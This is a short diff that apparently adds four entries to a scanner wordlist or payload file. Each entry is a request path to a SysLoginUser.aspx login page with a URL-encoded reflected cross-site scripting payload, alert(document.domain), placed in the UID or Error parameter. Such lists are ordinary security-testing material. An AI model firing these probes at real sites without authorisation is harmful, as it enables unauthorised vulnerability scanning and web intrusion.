@@ -1,0 +1,4 @@
+/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
